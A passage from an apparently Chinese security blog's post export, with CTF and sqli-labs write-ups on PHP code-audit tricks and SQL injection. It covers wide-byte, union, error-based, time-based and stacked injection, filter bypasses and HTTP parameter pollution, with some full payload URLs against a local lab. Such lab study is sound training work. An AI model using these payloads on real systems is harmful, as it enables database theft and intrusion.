这里特别说明什么时候是一次匹配的结束，就是检测到不是属于同一种特殊字符为止，因为这里每种特殊字符可以出现1次或者多次，举个例子，我们输入 第一次匹配结束是检测到a字符，不符合[:digit:]，所以开始第二次匹配 因为这里要成功匹配6次以上，所以每种类型的字符必须间隔出现6次以上，结合第一个条件，字符出现12个以上，于是我们可以输入11aaBB..22cc 验证一下： 1234567891011121314151617&lt;?phpif(isset($_GET[&apos;password&apos;]))&#123; $password=$_GET[&apos;password&apos;]; if(0&gt;=preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;,$password))&#123; echo &apos;Wrong Format 1&apos;; exit; &#125; $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; if(6&gt;preg_match_all($reg,$password,$arr))&#123; echo &apos;Wrong Format 2&apos;; exit; &#125; echo &apos;success&apos;;&#125;?&gt; 结果如下： 再来看第三个条件： 12345678$c = 0;$ps = array(&apos;punct&apos;, &apos;digit&apos;, &apos;upper&apos;, &apos;lower&apos;); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母foreach ($ps as $pt)&#123; if (preg_match(&quot;/[[:$pt:]]+/&quot;, $password)) $c += 1;&#125;if ($c &lt; 3) break; 如果$c&lt;3，那么我们就得不到flag值，也就是说要让$c&gt;=3，即成功匹配三次或以上 即出现三种类型字符或以上，按上面的输入：11aaBB..22cc，就行了，验证一下： 1234567891011121314151617181920212223242526272829&lt;?phpif(isset($_GET[&apos;password&apos;]))&#123; $password=$_GET[&apos;password&apos;]; if(0&gt;=preg_match(&apos;/^[[:graph:]]&#123;12,&#125;$/&apos;,$password))&#123; echo &apos;Wrong Format 1&apos;; exit; &#125; $reg = &apos;/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/&apos;; if(6&gt;preg_match_all($reg,$password,$arr))&#123; echo &apos;Wrong Format 2&apos;; exit; &#125; $c=0; $ps=array(&apos;punct&apos;,&apos;digit&apos;,&apos;upper&apos;,&apos;lower&apos;); foreach($ps as $pt)&#123; if(preg_match(&quot;/[[:$pt:]]+/&quot;,$password))&#123; $c += 1; &#125; &#125; if($c&lt;3)&#123; echo &apos;Wrong Format 3&apos;; exit; &#125; echo &apos;success&apos;;&#125;?&gt; 再看最后一个关键条件： 1if(&quot;42&quot; == $password) echo $flag; 执行了这个语句我们才可以得到想要的flag，也就是password值等于’42’，因为类型都是字符串，所以password中的值必须等于42，结合上面的三个条件 成功的输入可以有： 42.000e%2b000000000 420.000000000000e-1","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/categories/代码审计/"}],"tags":[{"name":"php","slug":"php","permalink":"https://Foxgrin.github.io/tags/php/"}]},{"title":"url二次编码绕过","slug":"url二次编码绕过","date":"2018-07-10T12:10:00.000Z","updated":"2018-07-10T12:17:46.498Z","comments":true,"path":"/posts/9338/","link":"","permalink":"https://Foxgrin.github.io/posts/9338/","excerpt":"Bugkuctf题库中的一道代码审计题，通过url二次编码绕过过滤得到flag","text":"Bugkuctf题库中的一道代码审计题，通过url二次编码绕过过滤得到flag 源代码如下： 1234567891011121314&lt;?php$flag='flag&#123;xxxx&#125;';if(preg_match(\"/hackerDJ/\",$_GET['id']))&#123; echo \"not allowed\"; exit;&#125;$id=$_GET['id'];$id=urldecode($id);if(\"hackerDJ\" == $id)&#123; echo $flag;&#125;?&gt; 看代码第一感觉将hackerDJ进行一次URL编码即可绕过过滤 将一次编码后的值输入 发现自动转化成了hackerDJ，为什么呢，因为我们提交id值给服务器时，服务器会对id值自动url解码，所以要对hackerDJ进行二次URL编码才可以绕过 输入二次编码后的值 成功得到flag值","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/categories/代码审计/"}],"tags":[{"name":"php","slug":"php","permalink":"https://Foxgrin.github.io/tags/php/"}]},{"title":"extract变量覆盖","slug":"extract变量覆盖","date":"2018-07-10T11:37:00.000Z","updated":"2018-07-10T12:04:55.616Z","comments":true,"path":"/posts/25619/","link":"","permalink":"https://Foxgrin.github.io/posts/25619/","excerpt":"Bugkuctf题库中的一道代码审计题，通过巧妙利用file_get_contents函数特性来绕过extract变量覆盖","text":"Bugkuctf题库中的一道代码审计题，通过巧妙利用file_get_contents函数特性来绕过extract变量覆盖 源代码如下： 12345678910111213141516&lt;?php$flag=&apos;../readme.txt&apos;;extract($_GET);if(isset($shiyan))&#123; @$content=trim(file_get_contents($flag)); if($shiyan == $content)&#123; echo &apos;flag&#123;xxx&#125;&apos;; &#125; else&#123; echo &apos;oh,no&apos;; &#125;&#125;?&gt; 首先先弄明白几个函数： extract:该函数将数组的键名作为变量名，键名对应的键值作为对应的变量值，返回值为设置成功的变量个数 也就是说这里的extract($_GET)将我们GET的参数名作为变量名，参数值作为变量值 例子如下： 123456789101112&lt;?phpif(isset($_GET[&apos;shiyan&apos;]) $$ isset($_GET[&apos;flag&apos;]))&#123; $a=extract($_GET); echo &apos;$a:&apos;.$a; echo &apos;&lt;br&gt;&apos;; echo &apos;$shiyan:&apos;.$shiyan; echo &apos;&lt;br&gt;&apos;; echo &apos;$flag:&apos;.$flag;&#125;?&gt; 输出结果： 成功设置了两个变量，$shiyan和$flag，所以$a=2 file_get_contents：将文件内容作为字符串输出 例子如下： 1234567&lt;?php$flag=&apos;../readme.txt&apos;;$content=file_get_contents($flag);echo $content;?&gt; 输出结果 这里注意file_get_contents函数里的参数是$flag，也就是说我们GET进来的参数flag值会将之前的flag值覆盖掉，从而造成变量覆盖，而我们输入的flag值如果不为文件名，函数执行错误，$content会被赋值为空 例子如下： 12345678910&lt;?php$flag=&apos;../readme.txt&apos;;if(isset($_GET[&apos;flag&apos;]))&#123; extract($_GET); @$content=file_get_contents($flag); echo $content.&apos;1&apos;;&#125;?&gt; 输出结果： 要得到最终要的flag，就必须要让变量content值等于变量shiyan的值 所以我们可以让shiyan值也为空，这样flag值任意输入，只要不为文件名，就一定相等 另外，即使shiyan值为空，isset($shiyan)也是返回true的 12345678&lt;?php$shiyan=&quot;&quot;;if(isset($shiyan))&#123; echo &quot;11&quot;;&#125;?&gt; 输出结果：","categories":[{"name":"代码审计","slug":"代码审计","permalink":"https://Foxgrin.github.io/categories/代码审计/"}],"tags":[{"name":"php","slug":"php","permalink":"https://Foxgrin.github.io/tags/php/"}]},{"title":"Bugkuctf-sql注入2","slug":"Bugkuctf-sql注入2","date":"2018-07-10T11:19:00.000Z","updated":"2018-07-10T12:25:05.822Z","comments":true,"path":"/posts/15184/","link":"","permalink":"https://Foxgrin.github.io/posts/15184/","excerpt":"Bugkuctf题库中的sql注入类题","text":"Bugkuctf题库中的sql注入类题 今天继续做web类的题 从题目给出的一段代码，查询各个函数的作用 可以看出，这段PHP程序过滤了数组里的关键字，且对我们输入的id的值进行了标签的剥离。一开始还不懂什么意思，没事我们来试一下就慢慢懂了 跟个注入题一样，输入id值为0,1时有返回值，其他无返回值 试试id=1’,id=1”,id=1’),id=1”)发现都未返回报错信息 就用基于时间的盲注试一下 咦，这时候居然爆出了这么一段话，再回头看看之前查询的函数，原来我们输入的id值中包含了数组中的敏感关键字，所以爆出了这段话，再看看strip_tags()这个函数，它能剥离输入字符串中的html标签，那我们试试，在敏感关键字中的出现位置加入&lt;&gt;标签 果然就没有爆出之前的那段话了，又因为网页没有睡5秒，所以再试试id=1 发现程序睡了5秒，说明没有对输入的id的值进行单引号或者双引号的包裹 再查查输出的列数 发现返回两列，于是接下来就是熟悉的注入 爆出当前使用的数据库为sql3 爆出它的数据表 根据题目提示爆出id=1的hash字段值","categories":[{"name":"Bugkuctf-sql","slug":"Bugkuctf-sql","permalink":"https://Foxgrin.github.io/categories/Bugkuctf-sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"Bugkuctf-sql注入1","slug":"Bugkuctf-sql注入1","date":"2018-07-10T11:10:00.000Z","updated":"2018-07-10T12:25:11.257Z","comments":true,"path":"/posts/14864/","link":"","permalink":"https://Foxgrin.github.io/posts/14864/","excerpt":"Bugkuctf题库中的sql注入类题","text":"Bugkuctf题库中的sql注入类题 今天试着开始做一些ctf的题目，因为最近刚好在学渗透，所以试着做了一下web类，做到一题sql注入题，按照之前学习的盲注方法，一开始先用/?id=1 紧接着再试着改变id的值，发现除了0,1返回结果都为空，就判断id为注入的变量 感觉节奏很好，便在/?id=1后面加了’，结果按照之前的经验会报错，然而这题的结果却是与之前没加引号的结果相同 在试着用 /?id=2’ union select 1,database() %23按照之前的经验会注出数据库的名字 然而结果依然为空… /?id=1’ and if(0&gt;1,1,sleep(5)) %23 会让程序睡5秒 然而结果并没有 通过查阅发现，原来这是一个有防御的php程序，使用了一个addslashed()函数，这个函数的作用是对用户输入的预定义字符前面加入转义字符‘\\’进行转义 执行这个php程序 可见当我们输入’后，经过addslashed()函数将’转化成\\’，就不再是一个单引号，从而避免了一般的注入，所以便产生了宽字节注入，其原理是当mysql使用gbk编码方式时，会将前两个字符看成一个汉字（当第一个字符ascii码大于128时（比如$df），才会达到汉字的范围），当我们输入单引号’时，mysql会调用转义函数将单引号变为\\’，其中\\的十六进制是%5c，mysql的GBK编码，会认为%df%5c是一个宽字节，也就是’ 運’，从而使单引号闭合（逃逸），进行注入攻击 当mysql接受客户端的数据后，会认为它的编码是character_set_client，然后将之转换成character_set_connection的编码，然后进入具体表和字段后，在转换成字段响应的编码，当查询结果产生后，会从表和字段的编码转换成character_set_results编码，返回给客户端 于是我们开始使用宽字节注入，发现开始报错了 爆一下查询字段数量，发现是2 爆数据库，发现数据库名为sql5 爆数据表，发现有key和test两个数据表 接下来爆列 可以发现出现了问题，原来是mysql中的转义函数将’test’的两个单引号前面都加了\\进行转义 因为题目有提示在key表的string字段下，于是查询 发现又出现了错误，查询后发现在用key替换key,或者用sql5.key，才能查询到结果","categories":[{"name":"Bugkuctf-sql","slug":"Bugkuctf-sql","permalink":"https://Foxgrin.github.io/categories/Bugkuctf-sql/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs54-61","slug":"sql-labs54-61","date":"2018-07-09T17:49:00.000Z","updated":"2018-07-10T08:31:49.435Z","comments":true,"path":"/posts/58593/","link":"","permalink":"https://Foxgrin.github.io/posts/58593/","excerpt":"总结了sql-labs的一些挑战关卡","text":"总结了sql-labs的一些挑战关卡 Less54-61Less-54这里开始进入挑战关卡，明显比前面难度提升了很多 直接看源代码吧 首先导入两个php文件 先看看sql-connect-1.php 连接mysql数据库，选择challenges这个数据库 再看看functions.php 里面定义了一堆函数，后面会一个个用到，我们先放着继续看下面的代码 这句代码将php文件的路径取了出来，我们把$pag值输出到文件看看 继续看下面 利用到functions里面的函数了，看看table_name这个函数 在mysql命令行输入 将取到的表名赋值给$table 将取得的两个列名分别赋值给两个变量 接着来到判断语句 当我们一开始还没有点击提交和重置按钮时 来到else语句，然后一开始cookie字段中没有challenge值 执行data函数 返回sessid值 然后设置cookie值 然后需要我们get传入id值，输入id值后 执行这个函数 一开始时tryy值为0 可见这个tryy值就是我们输入id的次数 当我们输入Id的次数大于10时，就执行 删除cookie中challenge字段值 并且重定向到另一个php文件同时get一个id值，值为 而这个php就是检测如果不存在challenges数据库的话就建立challenges这个数据库 ，并建立一个表，这个表的表名是随机的，见如下代码 并往这个表中添加数据 当我们post key值后点击提交按钮 则进行一个判断的sql语句 如果我们post值在col1列中，则返回1，否则不返回 然后成功提交key后，重定向到建立表的php，重新建立challenges表 也就是说，这关整体思路就是利用id值进行注入，有10次尝试的机会，一开始已经告诉我们表名是challenges，要在表中拿到key值 那么我们开始注入 首先一开始仍然是判断id有没有被引号包裹 发现被单引号包裹，那么接下来判断返回列数 返回3列 那就可以联合注入了 爆数据库 爆表 爆列 我们要找的key应该是在第三个列 最后报出key，提交 Less-55这里没有报错信息，id被()包裹，尝试次数为14次，其他和之前关卡没有什么区别 Less-56Id被(‘’)包裹，剩下的跟之前关卡一样 Less-57Id被””包裹，剩下的和之前一样 Less-58这关输入id值发现并没有返回正确信息，而且这里尝试次数仅为5次 看一下源代码 这里定义了一个数组，并且将用了一个数组顺序反转的函数array_reverse() 写个test测试一下 如果是关联数组 然后根据我们输入的id值进行mysql查询，将查询结果的id值作为数组的索引 所以输出一定是数组里的内容，不可能得到我们想要的信息，但是这里有报错信息显示，所以我们可以考虑用报错注入 Less-59这里id没有被引号包裹，其他跟之前一样 Less-60Id被（“”）包裹，其他跟之前一样 Less-61这关id被((‘’))包裹，其他跟之前一样","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs50-53","slug":"sql-labs50-53","date":"2018-07-09T09:08:00.000Z","updated":"2018-07-09T13:33:44.951Z","comments":true,"path":"/posts/58721/","link":"","permalink":"https://Foxgrin.github.io/posts/58721/","excerpt":"总结了sql-labs中关于order by 注入和堆叠注入结合的关卡","text":"总结了sql-labs中关于order by 注入和堆叠注入结合的关卡 Less50-53Less-50输入sort=1,2,3得到正常排序的表，输入sort=1’和sort=1”都报错，说明没有引号包裹 先试试rand() 再试试报错注入 延时注入 发现都可以正常注入 看一下源代码 发现多重查询 说明这关可以进行堆叠注入 发现添加了新的一行 被单引号包裹 Less-52 被单引号包裹，没有报错信息 对堆叠注入没有影响 Less-53 被单引号包裹，并且没有报错，依然对堆叠没有影响","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs46-49","slug":"sql-labs46-49","date":"2018-07-09T08:38:00.000Z","updated":"2018-07-09T13:33:44.951Z","comments":true,"path":"/posts/15069/","link":"","permalink":"https://Foxgrin.github.io/posts/15069/","excerpt":"总结了sql-labs中关于order by后面的注入的一些关卡","text":"总结了sql-labs中关于order by后面的注入的一些关卡 Less46-49Less46首先页面呈现 要我们get方式输入一个名为sort的参数 那我们输入/?sort=1 发现输出了users表里面的信息 输入sort=2时，发现排序变化了，按照第二列username的值进行了排序，于是猜测sql语句为select * from users order by get[‘sort’]， 但是，又有个问题，之前的关卡都是将查询的结果利用mysql_fetch_array($result)=$row，这样都是输出一行结果，为什么这关输出了所有的结果 看一下源代码 Sql语句与猜想的一样 如果查询的结果不为空，那么 建立一个表格 Th标签能使里面的文件加粗并居中，td标签里的文本是默认向左对齐，不加粗 这是最关键的代码，和之前关卡不一样，这里用到了新的一个函数，mysql_fetch_assoc() 经过查询，这个函数与mysql_fetch_array区别只在于前者返回的是关联数组，而后者既能返回关联数组又能返回索引数组 而要返回多个结果，就需要while循环，如果不用while循环，那么只能返回一个查询结果 源代码搞懂了，那么怎么进行注入呢 输入sort=1 desc，变成降序排列，默认是asc，也就是升序排列 我们通过sql语句观察出这题注入点应该是order by 后面的数字 先认识一个随机查询，select * from users order by rand() Rand()函数是随机产生一个0到1之间的数字 可以看出两次产生的是不同的随机数 而如果在括号内指定参数即rand(0)和rand(1)，则会产生固定的随机数种子 随机查询就是利用rand()函数产生不同的随机数种子，这些产生的随机数进行order by 排序，order by后面的参数如果是产生固定的随机数种子，随机排序的表就是固定的 于是我们利用在rand()函数的参数中构造逻辑表达式，根据返回的表判断逻辑表达式的真假，从而进行注入，比如/?sort=rand(ascii(substr(database(),1,1))=115) 发现返回是rand(false)也就是rand(0)的随机排序表，说明上述逻辑表达式为假 我们再先试试union查询可不可以 报错了，是不是union 和order by不能一起使用了，我们在mysql命令行中测试一下，发现以下两种是不会报错的，一种是在联合两边的select 语句分别加括号，一种是将order by放入后面的select语句 为什么呢，经过查询发现union查询并不是只是简简单单的将两个子查询结果进行拼接，而是将两个查询结果统一查询，所以order by 应该放在最后一个子查询中 然而这关我们是在order by后进行注入，所以不能使用union注入 那能不能使用延时注入呢，也就是通过order by 1 and if(,1,sleep()) 我们先在mysql命令行中测试一下 发现sleep了18秒，猜测是因为有18秒的原因，至于为什么是排序成这样，请教学长，学长也无法解释，暂时将这个问题搁在一边，但是抛开这个问题，利用这个方法进行延时注入是可行的，经过测试只要保证order by后面的参数不会报错，就能执行and后面的语句，经过测试带小数的数字，任何字符和字符串，列名，1,2,3都不会报错，但只有列名和1,2,3当做参数，才会对表排序，其他都会得到原来的表 下面试试延时注入 成功延时9秒 再试试能不能通过and 进行报错注入 非常完美，那么就可以进行熟悉爆表爆列了 http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%20extractvalue(1,concat(0x3a,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=database()),0x3a)) http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%20extractvalue(1,concat(0x3a,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),0x3a)) 那么count(),group by,floor(rand(0)2)的报错注入能不能在这里运用呢 http://127.0.0.1/sqli/sqli-labs/Less-46/?sort=1%20and%201=(select%20count(*)%20from%20information_schema.columns%20group%20by%20concat(0x3a,database(),0x3a,floor(rand(0)*2))) 没问题，但除此之外还有一种方法进行这种报错注入，就是利用sort=(select …)进行报错注入 还有一种方法，可以在order by后面的procedure analyse参数进行报错注入 但是这里又碰到一个问题，procedure analyse后面的报错注入，加入子查询语句会报错，原因未知，可能是语法错误，暂时来看这个方法只能注出库名，用户名和版本 Into outfile 注入 Less-47输入sort=1,2,3发现都得到原来的表，猜测sort可能被引号包裹，成为字符，所以排序后仍为原来的表，加个单引号 发现报错了，果然被单引号包裹了 先试试随机查询rand() 还是原来的表，说明这里用rand()是不行的 那么用and +报错注入 延时注入 另外一种报错注入，经过测试必须通过and 后面才能执行，之前关卡的sort=(select …)方法测试不会报错 Procedure analyse 报错注入 Less-48输入sort=1,2,3，发现正常排序，说明sort没有被引号包裹，输入1’ 发现没有报错，说明不返回报错信息，所以这关不能用报错注入 排除sort=(select count(*))注入和and +报错和procedure analyse 报错注入 那么试试sort=rand()注入 这是rand(true)排序的表 这是rand(false)排序的表 再试试 and +延时注入 导出文件 Less-49输入sort=1,2,3发现都得到原来的表，说明有引号包裹，在输入sort=1’，没有输出表，没有报错，说明被单引号包裹，并且没有返回报错信息 那么排除了报错注入，rand()，那只能延时注入和导出文件了 文件导出","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs38-45","slug":"sql-labs38-45","date":"2018-07-09T08:07:00.000Z","updated":"2018-07-09T13:33:44.949Z","comments":true,"path":"/posts/5994/","link":"","permalink":"https://Foxgrin.github.io/posts/5994/","excerpt":"总结了sql-labs中堆叠注入的一些关卡","text":"总结了sql-labs中堆叠注入的一些关卡 Less38-45Less-38一开始做这关发现跟之前关卡没有什么区别，可以正常的注出数据库等信息 但是这关要考察的是堆叠注入，也就是多语句查询，我们在mysql命令行中就可以验证，在前面一个sql语句结尾加上;，再加入一个sql语句，mysql就会一起执行这两个sql语句 可以看出两个语句都执行了 然而在之前关卡试了一下，是不能堆叠注入，看看这关源代码，发现与之前关卡连接数据库的方式变化了 这里用了mysqli函数来连接数据库 查询一下mysqli连接方式跟之前mysql连接方式，大致区别就是mysqli是一种新型的连接方式，然后应用在本关就能支持堆叠注入，原因它有个支持多查询的函数 由于第二个查询是网页上是看不到结果，即使有错误信息也是看不到的，所以一般不用查询语句来堆叠注入 例如可以进行一些数据库数据表的增删改操作，然后在mysql命令行进行验证 例如创建一个数据表test 删去表test 往users表中添加信息 即使第二条语句出现错误，我们也不会看到报错信息，所以一定要保证输入的语句不会出现错误 Less-39这关跟上一关区别就在于id没有被包裹 Less-40这关id值被(‘’)包裹，其他的跟之前没区别 测试一下延时注入是否使用在堆叠注入 经过测试是不行的，因为服务器只会返回给我们的第一个语句查询结果，第二个语句虽然会执行，但是结果是不会返回给我们的 Less-41这关id没有被包裹，其余与之前关卡无区别 Less-42刚进入这关从页面来看有点像之前的二次注入，之前的二次注入思路是创建一个名为admin’#的用户，然后登陆这个用户，修改密码，由于修改密码页面的sql语句条件中的username是直接从session中取的，不经过过滤，所以通过二次注入，最终修改了admin用户的密码 而这关想创建新用户，发现 提示我们如果要创建新用户，就用黑客的方法 我们想到这几关的主题，堆叠注入，那么是不是可以通过堆叠注入，将admin’#用户名直接写入users表中，这样就不需要通过之前创建用户的方式来二次注入 看一下login.php的源代码 果然允许多查询 那么来找找注入点 发现password未经过过滤，所以我们就在password进行注入 成功登陆 并且添加admin’# 接下来登陆admin’# 并修改密码 发现admin密码被修改，成功通过堆叠注入实现二次注入 其他数据库和数据表增添，删改和之前关卡一样 另外本关还可以报错注入 Less-43 Password被（‘’）包裹，方法与上一关相同 Less-44这关没有报错信息，所以只能先延时注入 被单引号包裹 其他与之前关卡相同，就是不能报错注入了 Less-45一样没有报错信息，延时注入 被(‘’)包裹，其他与之前相同","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs29-37","slug":"sql-labs29-37","date":"2018-07-09T07:13:00.000Z","updated":"2018-07-09T13:33:44.949Z","comments":true,"path":"/posts/56021/","link":"","permalink":"https://Foxgrin.github.io/posts/56021/","excerpt":"总结了sql-labs中HTTP参数污染和宽字节注入的一些关卡","text":"总结了sql-labs中HTTP参数污染和宽字节注入的一些关卡 Less29-37Less-29 首先页面信息展示的是“这个页面受到世界上最好的防火墙的保护” n 经过一系列盲注，发现都没有什么特别的地方 看一下源码，发现这关有隐藏的登录页面 输入id=1 输入id=1’ 发现直接跳转到另外一个页面，尝试一系列盲注，都被防火墙拦截下来 看一下login.php的源码 首先，我们输入的请求信息以字符串的方式被截取下来 然后这个字符串被以&amp;为分隔符组合成数组 并且如果有一个元素是id=(某个值)，这个值被截取下来赋值给id_value 并判断这个值，如果不是完全由数字组成的，则跳转到被防火墙拦截页面 这个处理实际上就是服务器处理数据的原理 http服务器实际上有两个，当客户端发送请求数据给服务器时，数据会先经过第一个tomcat服务器，tomcat服务器先处理第一个请求参数，再将数据交给第二个apache服务器，apache服务器处理最后一个请求参数，将结果返回给tomcat,tomcat再返回给客户端 也就是说当我们输入/login.php?id=1&amp;id=2，最后服务器处理的是id=2这个参数，也就是最后一个参数 这关的代码实际上就是模仿在tomcat服务器设置防火墙，从而进行数据过滤，防止攻击 所以我们就可以用第一个参数骗过服务器，通过最后一个参数进行sql注入，这就属于hpp，也就是http参数污染漏洞攻击 第一个参数输入纯数字，第二个参数进行注入 剩下的就跟之前相同了 Less-30这题跟上题区别在于id被双引号包裹，其他方法跟上题相同 Less-31这题id被(“”)包裹，其余和前两题一样 Less-32输入id=1 再输入id=1’ 发现我们输入的值被经过处理了 查看源代码 Preg_quote()这个函数作用是在正则表达式中将特殊字符转义，比如一些在正则表达式中具有特殊意义的字符*-?等，如果不加以转义会被认为是特殊字符无法替换 还有php字符串中一个反斜杠应该写成’\\’，将一个反斜杠加以转义，使其成为真正意义上的反斜杠而不是转义字符 所以首先检查字符串，如果其中有一个反斜杠，就将其替换成三个反斜杠，不要纠结为什么是三个，这是官方文档的规定，简单来说就是我们输入一个反斜杠时将这个反斜杠转义就是了 第二次检查字符串中如果有’则被替换成\\’，就是将单引号转义 第三次就是将双引号转义 所以对我们输入的单引号，反斜杠和双引号进行了转义 这个函数的作用就是设置mysql的set-character-client 和 set-character-connection 和 Set-character-results三个参数的值设置为gbk编码 很容易联想到宽字节注入 我们在客户端输入id的值后，经过php服务器提交给mysql，mysql将接受的数据经过set-character-client的编码方式进行编码，再用set-character-connection的编码方式进行编码，然后进入数据库和数据表，根据库和表的默认编码方式进行编码，再将查询结果根据set-character-results编码返回给客户端 而gbk编码方式会将字符串中的两个字符看作是一个汉字，前提是前一个字符的ascii码大于128，所以我们输入id=%df%27时，经由过滤变成’%df%5c%27’，然后经过mysql的编码，认为%df%5c是一个汉字，从而造成单引号不被转义，造成前面单引号不闭合，从而注入 所以只要解决单引号被转义的问题，就与前面关卡没什么区别了 下面爆库 爆表 爆列 这里注意如果输入table_name=’users’，单引号会被转义，可以把users转成十六进制，从而避免使用单引号 延时注入 报错注入 Less-33这关与上一关区别在于使用了addslashes这个函数 这个函数可以将单引号，双引号和反斜杠转义 实际上与上一关功能相同，只不过这个函数可以实现上一关的三个替换功能 一样在单引号前面加上%df即可正常注入 Less-34这关用了POST提交表单的方法，依然对单引号，双引号和反斜杠有转义 查询语句如下： 与之前关卡区别在于，之前是GET方式提交的请求，而我们输入的GET参数是会经过url解码的，而POST则不会经过url解码，所以我们如果按照之前的方法输入username=admin%df’，发现%df不会被解码 所以不如我们替它解码，%df经过url解码后为字符�，所以我们可以输入admin�’ 果然有报错了 那么接下来又思考如何注出用户名和密码，因为username列的数据类型是字符串，不像是之前关卡id列的数据类型是整型，所以此处我们用万能密码 Username=�’ or 1=1# 发现成功注出了用户名和密码 结合查询语句 Select * from users where username=’’ and password=’’ limit 0,1 Select * from users where username=’ �\\’ or 1=1 Gbk编码将�和\\看做一个汉字，or语句逻辑运算，因为1=1恒为1所以条件恒为真，注出users表中所有用户名和密码 在mysql命令行验证一下 那么要注出下面几行的用户名和密码我们只需要加个limit n,1就ok了 其他注入和之前一样 爆库 爆表 爆列 报错注入 这里如果用and会导致前面为假而后面不执行，所以改成or 延时注入 关于延时注入，之前碰到的都是能前面id=某个数字能查到，然后根据某个判断条件执行sleep进行延时注入 而本关注入点username数据类型是字符串，也就是说必须跟列下数据完全一样，才能查的到值，而本关我们要注入，则必须要过滤转义字符从而使单引号逃逸，也就是我们过滤后username的值肯定不可能跟表里的值有相同的，即不能保证前面的值为真，要延时注入，就得用or sleep，or的执行条件前面为前面的条件为假 先查一下users表中又十四行数据 那我们进行延时注入 可见sleep了14秒，因为mysql要对每行数据进行查询，判断username有没有等于1的，如果没有，则执行sleep 1秒，总共要查询14行，14行都没有符合的，所以sleep了总共14秒 而如果是and的话，则是查询到数据才会执行sleep 1秒 在看看之前的过滤单引号的关卡构造闭合单引号的注入语句 为什么能查出所有数据 我觉得应该这样划分(username=‘admin’ and sleep(5)) or ‘1’=’1’，先查有没有等于admin的，如果没有不执行sleep，然后会执行or，执行结果为1. 如果有等于admin的，则执行sleep，但在要执行时，执行了or语句，结果1,不延迟 所以最终结果不管username的值有没有出现在表中，结果都为1，不会执行sleep 要进行注入的话，就必须将or换成and 所以本关延迟注入如图 Less-35试一下id=1%df’%23 发现报错 说明id没有任何包裹，所以本关也不需要宽字节注入，相当于之前的关卡了 Less-36这关跟之前区别在于转义函数用了mysql_real_escape_string() 但由于我们set names gbk，所以还是能用宽字节注入的方法，跟之前关卡一样 下面总结一下再使用addslashes和mysql_real_escape_string如何防御宽字节注入 Less-37 跟之前post关卡一样，只是用了mysql_real_escape_string HTTP参数污染参考链接：http://www.freebuf.com/articles/web/5908.html 宽字节注入参考链接：https://mp.weixin.qq.com/s/WjGaDxwaBkOzCe2BWGak2A","categories":[{"name":"sql-labs","slug":"sql-labs","permalink":"https://Foxgrin.github.io/categories/sql-labs/"}],"tags":[{"name":"sql","slug":"sql","permalink":"https://Foxgrin.github.io/tags/sql/"}]},{"title":"sql-labs23-28","slug":"sql-labs23-28","date":"2018-07-09T05:31:00.000Z","updated":"2018-07-09T13:33:44.950Z","comments":true,"path":"/posts/38551/","link":"","permalink":"https://Foxgrin.github.io/posts/38551/","excerpt":"总结一些sql-labs中带有过滤关键字的关卡","text":"总结一些sql-labs中带有过滤关键字的关卡 Less23-28Less-23 这关对注释符–+和#有过滤 因为id被单引号包裹 解决方法是通过构造payload来闭合单引号 爆数据库 爆表 爆列 如果采取报错注入的话，还有一种方法是通过or ‘1’=’1闭合单引号 如果用count(),group by,floor(rand(0)2)则要用and ‘1’=’1才会报错 延时注入 此处如果用or ‘1’=’1的话会导致后面恒为真，导致前面的sleep不被执行，所以应当换成and ‘1’=’1 Less-25从源代码可以分析出对关键字or 和and有过滤，并且不区分大小写 由于只过滤一次，所以可以用复写关键字的方法注入关键字or和and 爆数据库 爆表 爆列 延时注入 报错注入 Less-25a这关没有报出错误信息，所以考虑用延时注入 看出id没有被引号包裹 Less-26 从源代码分析出过滤了关键字and,or,/*,–,#,空格,/ 解决方法:(1)双写and 和 or ​ (2)使用or ‘1’=’1 闭合单引号 ​ (3) %09 TAB键（水平） ​ %0a 新建一行 ​ %0b TAB键（垂直） ​ %0c 新的一页 ​ %0d return功能 ​ %a0 空格 替代空格，但经过尝试，window下以上所有字符都替代不了空格，迫于无奈只好将源码中过滤空格的语句注释 延时注入 报错注入 联合注入 Less-26a这题没有报错信息，其余与上题一致 延时注入 看出id被(‘’)包裹 因为没有报错信息，所以无法用报错注入 于是用联合注入 爆库 爆表 爆列 Less-27 这关对关键字union和select有过滤 复写union，三写select或者大小写混合即可解决 这里id被单引号包裹 爆库 爆表 爆列 Less-27a这关没有报错信息，输入id=1’ 输入正确结果，因为id为int类型，所以说明id可能被双引号包裹 输入id=1” 查询不到结果，说明被双引号包裹 这关跟上一关一样，对关键字union和select进行了过滤，因为没有报错信息，所以不能用报错注入 联合注入 Less-28 Id被(‘’)包裹，这关没有报错信息，所以用联合注入 发现union和select 同时使用时就会被过滤掉，而且无视大小写 这里解决方法是复写union\\sselect Less-28a 这关只对union\\sselect进行了过滤，无报错信息 